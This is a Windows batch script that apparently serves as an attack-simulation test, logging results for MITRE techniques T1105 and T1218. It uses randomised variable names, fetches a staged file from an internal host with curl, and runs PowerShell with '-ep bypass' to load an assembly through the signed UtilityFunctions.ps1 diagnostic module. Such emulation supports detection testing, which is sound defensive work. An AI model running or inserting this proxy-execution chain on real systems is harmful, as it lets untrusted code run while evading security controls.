@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET pjkcpgw=%APPDATA%\7626\3b616936
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?7626-10
SET hlbnp=ITZEL-S2B
SET pudaazx=10
SET syjfr=potoshop.txt
SET ewjmdkff=7626

REM Derived values (random var names)
SET cklprxz=%APPDATA%\%pudaazx%
SET hjzdv=%cklprxz%\macula-simulations.log

REM TTP IDs
SET knjwt=T1105
SET kjtrh=T1218

REM 1. Heartbeat check (T1105)
SET wqjlr=0
SET qpgnm=
curl -k -s -o nul %drguvr%
IF !ERRORLEVEL! EQU 0 (SET wqjlr=1) ELSE (SET qpgnm=connection_refused)

REM Timestamp for T1105
FOR /F "tokens=2 delims==" %%I IN ('wmic os get localdatetime /value') DO SET cdbjf=%%I
SET zetnl=!cdbjf:~0,4!-!cdbjf:~4,2!-!cdbjf:~6,2!
SET mtwxj=!cdbjf:~8,2!:!cdbjf:~10,2!:!cdbjf:~12,2!.!cdbjf:~15,3!
SET gmsrt=[!zetnl! !mtwxj!][!hlbnp!]: !pudaazx!-!ewjmdkff!-!knjwt!|Ingress Tool Transfer=!wqjlr!:!qpgnm!

REM Log T1105
ECHO !gmsrt!>>!hjzdv! 2>nul || REM

REM 2. Execute DLL via lolbin (T1218)
SET bzrqw=0
SET fpbkd=
SET xqvmk=c:\windows\diagnostics\system\networking
powershell.exe -ep bypass -command "set-location -path !xqvmk!; import-module .\UtilityFunctions.ps1; RegSnapin !pjkcpgw!\!syjfr!;[Program.Class]::Dale()"
IF !ERRORLEVEL! EQU 0 (SET bzrqw=1) ELSE (SET fpbkd=assembly_load_failed)

REM Timestamp for T1218
FOR /F "tokens=2 delims==" %%I IN ('wmic os get localdatetime /value') DO SET cdbjf=%%I
SET zetnl=!cdbjf:~0,4!-!cdbjf:~4,2!-!cdbjf:~6,2!
SET mtwxj=!cdbjf:~8,2!:!cdbjf:~10,2!:!cdbjf:~12,2!.!cdbjf:~15,3!
SET gmsrt=[!zetnl! !mtwxj!][!hlbnp!]: !pudaazx!-!ewjmdkff!-!kjtrh!|Signed Binary Proxy Execution=!bzrqw!:!fpbkd!

REM Log T1218
ECHO !gmsrt!>>!hjzdv! 2>nul || REM

ENDLOCAL